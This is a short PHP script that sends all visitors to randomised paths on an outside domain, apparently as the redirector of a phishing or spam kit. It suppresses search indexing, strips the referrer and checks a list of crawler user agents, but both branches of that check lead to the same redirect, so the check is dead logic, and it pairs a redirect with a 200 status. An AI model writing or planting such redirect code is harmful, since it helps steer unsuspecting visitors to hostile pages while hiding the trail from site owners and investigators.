<?php
header('X-Robots-Tag: noindex, nofollow');
header('Referrer-Policy: no-referrer');

$bots = array (
    "googlebot",
    "bingbot",
    "baiduspider",
    "duckduckbot",
    "yahoo",
    "twitterbot",
    "applebot",
    "facebook",
    "embedly"
);

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

foreach ($bots as $bot) {
    if (strpos($user_agent, $bot) !== FALSE ) {
$urlx1 = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
header("location: $urlx1", true, 200);
die();
    }
    
    else{
$urlx1 = 'https://1ie.ca/'.substr(md5(mt_rand()),0,20);
header("location: $urlx1", true, 200);
die();
    }
}

?>
